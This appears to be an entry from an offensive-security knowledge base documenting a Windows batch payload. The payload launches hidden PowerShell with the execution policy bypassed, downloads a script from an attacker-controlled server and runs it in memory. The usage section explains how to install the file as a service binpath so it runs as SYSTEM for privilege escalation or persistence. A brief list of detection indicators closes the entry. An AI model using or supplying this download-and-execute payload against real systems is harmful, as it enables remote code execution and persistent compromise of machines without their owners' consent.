---
id: c740b5d5-3c83-46ff-833a-3ce7f594bb57
type: code
language: batch
verified: true
created_at: '2020-04-28T21:10:21.094075+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Windows
tags:
  - payload
  - execution
  - download-execute
validated: true
---

# Batch-Download-and-Execute-PowerShell-Script

## Code

```batch
@ECHO OFF
powershell -ep bypass -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
```

## Description

This batch script silently executes PowerShell to bypass execution policy, download a remote PowerShell script from an attacker-controlled server, and invoke it in memory using IEX. It is designed as a payload for service execution, enabling remote code execution without dropping additional files on disk.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_IP | IP address of the attacker's server hosting the script | 192.168.1.100 |
| $_SCRIPT.ps1 | Name of the PowerShell script file on the server | payload.ps1 |

## Usage

Save this as a .bat file (e.g., runme.bat) and set it as the binpath for a Windows service. When the service starts, the batch runs as SYSTEM, fetching and executing the remote script. Host the .ps1 file on a web server (e.g., Python's SimpleHTTPServer). Used in privilege escalation or persistence scenarios after Administrator access.

## Detection

- PowerShell logging (Module, ScriptBlock, or Transcription logging) capturing 'downloadString' or IEX invocations.
- Network connections to unusual IPs/ports for HTTP downloads from non-standard sources.
- Process monitoring: cmd.exe spawning powershell.exe with -ep bypass and -windowstyle hidden.
- File system anomalies: Suspicious .bat files in system directories like C:\Windows\Tasks.

## Related

- [[procedures/Create-and-Run-Windows-Service-as-SYSTEM-Administrator]]
- [[commands/Create-a-Windows-Service]]
